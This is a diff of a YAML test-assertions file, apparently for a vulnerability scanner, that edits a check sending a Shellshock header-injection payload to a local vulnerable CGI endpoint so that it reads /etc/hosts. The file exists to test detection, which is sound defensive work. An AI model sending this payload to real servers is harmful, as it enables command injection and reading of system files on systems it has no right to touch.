@@ -23,7 +23,7 @@ assertions:
   - name: exploit-can-read-etc-hosts
     type: command
     expect:
-      command: "curl -s -H 'User-Agent: () { :;}; echo; cat /etc/hosts' http://localhost:9211/cgi-bin/vulnerable | grep -q '127.0.0.1'"
+      command: "curl -s -H 'User-Agent: () { :;}; echo; /bin/cat /etc/hosts' http://localhost:9211/cgi-bin/vulnerable | grep -q '127.0.0.1'"
       exit_code: 0
 
   # Beacon should detect Shellshock via CGI header injection.
